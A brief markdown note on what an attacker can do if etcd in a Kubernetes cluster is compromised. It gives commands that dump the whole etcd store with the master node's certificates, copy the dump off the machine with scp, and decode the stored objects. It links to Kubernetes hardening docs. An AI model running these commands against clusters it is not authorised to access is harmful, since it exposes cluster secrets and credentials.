## What if ETCD is compromised

- SSH into master machine

- Fetch etcd full data after SSH into master machine
```
ETCDCTL_API=3 etcdctl --endpoints "https://127.0.0.1:2379" --cert /etc/kubernetes/pki/etcd/server.crt --key /etc/kubernetes/pki/etcd/server.key --cacert /etc/kubernetes/pki/etcd/ca.crt get "" --prefix=true -w json >> ~/etcd-kv.json
```

- Copy the above file to local machine
```
scp root@k8s-master:~/etcd-kv.json .
```

- Decode the yamls in etcd
```
cat etcd-kv.json | jq -r '.kvs | .[0].value' | base64 -D
```


## References
- https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster/#restrict-access-to-etcd

- https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster/#encrypt-secrets-at-rest
